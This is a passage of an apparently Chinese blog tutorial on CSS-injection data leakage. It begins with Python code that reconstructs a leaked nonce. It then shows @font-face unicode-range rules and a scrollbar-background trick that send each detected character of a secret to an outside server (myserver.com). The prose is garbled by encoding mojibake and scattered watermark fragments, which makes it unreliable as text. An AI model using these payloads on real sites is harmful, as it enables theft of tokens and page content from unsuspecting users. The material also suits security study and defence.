        start_i <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
        left <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            end_j <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> i <span class="token operator">!=</span> j<span class="token punctuation">:</span>
                <span class="token keyword">if</span> start_i <span class="token operator">==</span> end_j<span class="token punctuation">:</span>
                    left <span class="token operator">=</span> <span class="token number">1</span>
                    <span class="token keyword">break</span>
        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token comment"># beginning</span>
            remove_i <span class="token operator">=</span> i
            nonce <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no beginning - aborting"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nonce<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        new_substr <span class="token operator">=</span> new_substr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>remove_i<span class="token punctuation">]</span> <span class="token operator">+</span> new_substr<span class="token punctuation">[</span>remove_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token comment"># print("new substr: " + str(new_substr))</span>
        found <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>new_substr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            start_i <span class="token operator">=</span> new_substr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nonce<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> start_i<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token comment"># print("found: " + start_i)</span>
                found <span class="token operator">+=</span> <span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># start over from latest backup</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>backup<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                nonce <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
                found <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
                new_substr <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
                backup <span class="token operator">=</span> backup<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no backup - aborting"</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"found more than one: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span><span class="token punctuation">)</span>
                backup <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>nonce<span class="token punctuation">,</span> found<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> new_substr<span class="token punctuation">]</span><span class="token punctuation">]</span>
            remove_i <span class="token operator">=</span> found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            nonce <span class="token operator">+=</span> new_substr<span class="token punctuation">[</span>remove_i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token comment"># input("nonce: " + nonce)</span>

    <span class="token keyword">return</span> nonce
</code></pre>

<h2 id="9-é¡µé¢å†…å®¹æ³„éœ²"><a href="#9-é¡µé¢å†…å®¹æ³„éœ²" class="headerlink" title="9. é¡µé¢å†…å®¹æ³„éœ²"></a>9. é¡µé¢å†…å®¹æ³„éœ²</h2><p>ä¸Šè¿°ä»‹ç»çš„æ–¹æ³•ç”±äº CSS Selector <span class="hexo-wm">sâ€‹ï»¿Â³vğ˜¦ğ’â€¤â€ğ˜´iâ€ğ­ï½…â€</span>çš„é™åˆ¶ï¼Œåªèƒ½å¤Ÿè·å–åˆ°å…ƒç´ å±æ€§çš„å€¼ï¼Œ<br>å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–åˆ°é¡µé¢ä¸Šçš„å…¶ä»–æ–‡å­—æˆ–è€…è„šæœ¬çš„å†…å®¹ï¼Œåˆ™éœ€è¦ä½¿ç”¨å…¶ä»–çš„ç‰¹æ®Šæ–¹æ³•</p>
<h3 id="9-1-unicode-range"><a href="#9-1-unicode-range" class="headerlink" title="9.1 unicode-range"></a>9.1 unicode-range</h3><blockquote>
<p>unicode-range <span class="hexo-wm">ğ˜´â€Œâ€Œ3ğ’—â„¯ğ’.â€Œâ€Œğ’”ğ˜ªï»¿ğ­ğ˜¦â€‹â€</span>å¯ä»¥é’ˆå¯¹ä¸åŒçš„å­—å…ƒï¼Œ<span class="hexo-wm">ğ’”ï»¿â€â‘¶vğ˜¦ğ’Â·ï»¿êœ±ğ˜ªï»¿ğ­â„®ï»¿</span>è½½å…¥ä¸åŒçš„å­—ä½“</p>
</blockquote>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Ampersand"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span><span class="token string">"Times New Roman"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+26<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token selector">div</span> <span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> Ampersand<span class="token punctuation">,</span> Helvetica<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>Me &amp; You = Us<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
<p><code>&amp;</code> çš„ unicode æ˜¯ U+0026ï¼Œå› æ­¤åªæœ‰ <code>&amp;</code> è¿™ä¸ªå­—ä¼šç”¨ä¸åŒçš„å­—ä½“æ¥æ˜¾ç¤ºï¼Œå‰©ä½™éƒ¨åˆ†éƒ½ç”¨åŒä¸€ä¸ªå­—ä½“<br>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒ<span class="hexo-wm">ğ˜€ï»¿â€â‘¶ğ˜·ğğ§Â·â€‹ï»¿Ñ•â…ˆï»¿â€teâ€Œ</span>æ¥æ³„éœ²é¡µé¢ä¸­çš„å†…å®¹ï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;body&gt;
    &lt;style&gt;
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f1"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+31<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f2"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=2<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+32<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f3"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=3<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+33<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+61<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fb"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+62<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fc"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=c<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+63<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token selector">div</span> <span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f3<span class="token punctuation">,</span> fa<span class="token punctuation">,</span> fb<span class="token punctuation">,</span> fc<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    &lt;/style&gt;
    <span class="token property">Secret</span><span class="token punctuation">:</span> &lt;div&gt;ca31a&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>ä½†è¿™ç§æ–¹æ³•ä¹Ÿå…·æœ‰å±€é™æ€§ï¼š</p>
<ol>
<li>æ— æ³•å¾—çŸ¥å­—å…ƒçš„é¡ºåº</li>
<li>æ— æ³•è·çŸ¥å­—å…ƒçš„é‡å¤ä¸å¦</li>
</ol>
<h3 id="9-2-å­—ä½“é«˜åº¦å·®å¼‚-first-line-scrollbar"><a href="#9-2-å­—ä½“é«˜åº¦å·®å¼‚-first-line-scrollbar" class="headerlink" title="9.2 å­—ä½“é«˜åº¦å·®å¼‚ + first-line + scrollbar"></a>9.2 å­—ä½“é«˜åº¦å·®å¼‚ + first-line + scrollbar</h3><p>æˆ‘ä»¬å…¶å®å¯ä»¥ä¸è½½å…¥å¤–éƒ¨å­—ä½“ï¼Œç”¨å†…å»ºçš„å­—ä½“å°±èƒ½æ³„éœ²å‡ºå­—å…ƒã€‚<br>æˆ‘ä»¬é¦–å…ˆè¦æ‰¾å‡ºä¸¤ç»„é«˜åº¦ä¸åŒçš„å†…å»ºå­—ä½“ï¼Œ<br>ä¾‹å¦‚ <code>Comic Sans MS</code> å­—ä½“ï¼Œå·²çŸ¥å®ƒçš„é«˜åº¦æ¯” <code>Courier New</code> é«˜ï¼Œ<br>å‡è®¾é¢„è®¾çš„å­—ä½“é«˜åº¦æ˜¯ 30px ï¼Œè€Œ Comic Sans MS æ˜¯ 45px ï¼Œé‚£ç°åœ¨æˆ‘ä»¬æŠŠæ–‡å­—åŒºå—çš„é«˜åº¦è®¾æˆ 40px ï¼Œå¹¶ä¸”è½½å…¥å­—ä½“ï¼š</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token selector">div</span> <span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>DBC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>ABC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>

<p><img src="image-6.png" alt="image-6.png"></p>
<p>åœ¨å›¾ä¸­ï¼Œå¾ˆæ˜æ˜¾ <code>A</code> æ¯”å…¶ä»–å­—å…ƒçš„é«˜åº¦éƒ½é«˜ï¼Œ<br>è€Œä¸”æ ¹æ®æˆ‘ä»¬çš„ CSS è®¾å®šï¼Œå¦‚æœå†…å®¹é«˜åº¦è¶…è¿‡å®¹å™¨é«˜åº¦ï¼Œ<span class="hexo-wm">ğ˜€â€ŒÂ³â…´â„¯nâˆ™â€‹ğ˜€ğ¢ï»¿tğ˜¦â€Œ</span>ä¼šå‡ºç° scrollbar ã€‚<br>è™½ç„¶å›¾ä¸­çœ‹ä¸å‡ºæ¥ï¼Œä½†æ˜¯ä¸‹é¢çš„ ABC å­˜åœ¨ scrollbarï¼Œè€Œä¸Šé¢çš„ DBC å´æ²¡æœ‰ã€‚</p>
<p>å¦‚æœæ­¤æ—¶æˆ‘ä»¬ç»™ <span class="hexo-wm">sâ€Œ3ğ’—ï½…ğ˜¯ï¼â€â€‹ğ¬iâ€‹ï»¿ï½”eâ€‹</span>scrollbar è®¾ç½®ä¸€ä¸ª styleï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div::-webkit-scrollbar</span> <span class="token punctuation">{</span>
    <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">{</span>
    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>

<p>åˆ™å¦‚æœæœ‰ scrollbar å‡ºç°ï¼Œ<span class="hexo-wm">ğ˜€ï»¿Â³ğ¯ğğ’â€¤â€‹ğ˜´ğ˜ªï»¿ğ’•ï½…ï»¿â€</span>æˆ‘ä»¬çš„ server å°±ä¼šæ”¶åˆ°è¯·æ±‚ï¼Œ<br>å¦‚æœ scrollbar æ²¡æœ‰å‡ºç°ï¼Œæˆ‘ä»¬å°±ä¸ä¼šæ”¶åˆ°è¯·æ±‚ã€‚</p>
<p>æ‰€ä»¥å½“æˆ‘ä»¬æŠŠ <span class="hexo-wm">ğ¬â€Œâ‘¶ğ’—eğ’â€¢ï»¿ğ¬ğ¢â€Œtâ„®ï»¿â€‹</span>div å¥—ç”¨ fa å­—ä½“æ—¶ï¼Œ</p>
<ul>
<li>å¦‚æœç”»é¢ä¸Šæœ‰ <code>A</code> ï¼Œå°±ä¼šå‡ºç° scrollbar ï¼Œæˆ‘ä»¬çš„ <span class="hexo-wm">Ñ•â€â‘¶â…´ï½…ğ˜¯â€¤â€â€Œğ˜€ğ¢â€‹ğ’•ğ˜¦â€‹ï»¿</span>server å°±ä¼šæ”¶åˆ°è¯·æ±‚ã€‚</li>
<li>å¦‚æœç”»é¢ä¸Šæ²¡æœ‰ <code>A</code> ï¼Œå°±ä»€ä¹ˆäº‹æƒ…<span class="hexo-wm">sâ€â€ğŸ¯ğ˜·â„¯ï½âˆ™ï»¿ğ¬ï½‰â€Œâ€ğ’•ğ˜¦â€â€</span>éƒ½ä¸ä¼šå‘ç”Ÿã€‚</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘å¦‚æœä¸€ç›´é‡å¤è½½å…¥ä¸åŒå­—ä½“ï¼Œé‚£æˆ‘åœ¨ server å°±èƒ½çŸ¥é“ç”»é¢ä¸Šæœ‰ä»€ä¹ˆå­—å…ƒï¼Œ<span class="hexo-wm">ğ’”â€â‘¶ğ˜·ğ˜¦ğ˜¯Â·â€Œï»¿ğ¬â…ˆâ€Œğ˜µğâ€Œ</span>è¿™ç‚¹è·Ÿåˆšåˆšæˆ‘ä»¬ä½¿ç”¨ unicode-range åšåˆ°çš„äº‹æƒ…æ˜¯ä¸€æ ·çš„ã€‚</p>
<h4 id="9-2-1-å­—å…ƒé¡ºåºé—®é¢˜"><a href="#9-2-1-å­—å…ƒé¡ºåºé—®é¢˜" class="headerlink" title="9.2.1 å­—å…ƒé¡ºåºé—®é¢˜"></a>9.2.1 å­—å…ƒé¡ºåºé—®é¢˜</h4><p>æˆ‘ä»¬å…ˆæŠŠ div çš„å®½åº¦ç¼©å‡åˆ°åªèƒ½æ˜¾ç¤ºä¸€ä¸ªå­—å…ƒï¼Œ<br>è¿™æ ·å…¶ä»–å­—å…ƒå°±ä¼šè¢«æ”¾åˆ°ç¬¬äºŒè¡Œå»ï¼Œ<br>å†ä½¿ç”¨ <code>::first-line</code> çš„ selector <span class="hexo-wm">êœ±â€‹â€Â³ğ¯ğğ§ï¼â€‹êœ±iâ€â€‹ğ’•â„®â€‹ï»¿</span>ï¼Œå°±å¯ä»¥ç‰¹åˆ«é’ˆå¯¹ç¬¬ä¸€è¡Œæ¥è®¾ç½®æ ·å¼ï¼š</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css">
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">{</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span><span class="token function">local</span><span class="token punctuation">(</span><span class="token string">'Comic Sans MS'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">font-style</span><span class="token punctuation">:</span>monospace<span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+41<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token selector">div</span> <span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
        <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
        <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> fa<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
        <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
        <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
        <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
        <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

      <span class="token selector">div::first-line</span><span class="token punctuation">{</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>CBAD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre>
<p>ç”»é¢ä¸Šå°±åªä¼šå­˜åœ¨ä¸€ä¸ª <code>C</code> çš„å­—å…ƒï¼Œ<br>å› ä¸ºæˆ‘ä»¬å…ˆç”¨<code>font-size: 0px</code> æŠŠæ‰€æœ‰å­—å…ƒçš„å°ºå¯¸éƒ½è®¾ä¸º 0ï¼Œ<br>å†ç”¨ <code>div::first-line</code> å»åšè°ƒæ•´ï¼Œ<br>è®©ç¬¬ä¸€è¡Œçš„ <code>font-size</code> å˜æˆ 30pxã€‚<br>æ¢å¥è¯è¯´ï¼Œåªæœ‰ç¬¬ä¸€è¡Œçš„å­—å…ƒèƒ½çœ‹åˆ°ï¼Œè€Œç°åœ¨çš„ div <span class="hexo-wm">êœ±ï»¿â€‹Â³ğ˜·ï½…ğ§Â·ï»¿ğ¬iâ€Œï½”ğ˜¦â€‹</span>å®½åº¦åªæœ‰ 20pxï¼Œæ‰€ä»¥åªä¼šå‡ºç°ç¬¬ä¸€ä¸ªå­—å…ƒã€‚</p>
<p>æ¥ç€ï¼Œæˆ‘ä»¬å†è¿ç”¨åˆšåˆšå­¦ä¼šçš„é‚£æ‹›ï¼Œå»è½½å…¥ä¸åŒçš„å­—ä½“ã€‚<br>å½“æˆ‘è½½å…¥ fa è¿™ä¸ªå­—ä½“æ—¶ï¼Œ<span class="hexo-wm">êœ±â€‹â€‹3ğ’—ğğ§Â·ï»¿â€‹Ñ•â…ˆâ€Œâ€ğ˜µï½…ï»¿</span>å› ä¸ºç”»é¢ä¸Šæ²¡æœ‰å‡ºç° <code>A</code> ï¼Œæ‰€ä»¥ä¸ä¼šæœ‰ä»»ä½•å˜åŒ–ã€‚<br>ä½†æ˜¯å½“æˆ‘è½½å…¥ fc è¿™ä¸ªå­—ä½“æ—¶ï¼Œç”»é¢ä¸Šæœ‰ <code>C</code> ï¼Œ<br>æ‰€ä»¥å°±ä¼šç”¨ <code>Comic Sans MS</code> æ¥æ˜¾ç¤º <code>C</code> ï¼Œé«˜åº¦å°±ä¼šå˜é«˜ï¼Œscrollbar å°±ä¼šå‡ºç°ï¼Œ<br>å°±å¯ä»¥åˆ©ç”¨å®ƒæ¥å‘å‡ºè¯·æ±‚ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">{</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
  <span class="token property">height</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span>
  <span class="token property">width</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
  <span class="token property">font-family</span><span class="token punctuation">:</span> fc<span class="token punctuation">,</span> <span class="token string">"Courier New"</span><span class="token punctuation">;</span>
  <span class="token property">letter-spacing</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>
  <span class="token property">word-break</span><span class="token punctuation">:</span> break-all<span class="token punctuation">;</span>
  <span class="token property">overflow-y</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>
  <span class="token property">overflow-x</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>
